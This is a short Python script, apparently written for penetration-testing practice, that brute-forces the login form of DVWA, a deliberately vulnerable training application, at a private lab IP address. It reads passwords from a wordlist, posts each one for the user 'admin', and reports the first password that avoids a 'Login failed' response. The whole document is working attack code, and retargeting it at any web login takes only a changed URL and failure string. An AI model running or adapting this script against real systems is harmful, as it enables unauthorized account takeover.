import requests


target_url = "http://192.168.42.130/dvwa/login.php"
data_dict = {"username" : "admin", "password" : "", "Login" : "sumbit"}


with open("passwords.txt", "r") as password_list:
    for line in password_list:
        password = line.strip()
        data_dict["password"] = password
        response = requests.post(target_url, data=data_dict)
        if "Login failed" not in response.content.decode(errors="ignore"):
            print("[+] Password found -: ", password)
            exit()

print("[-] Password not found List ended")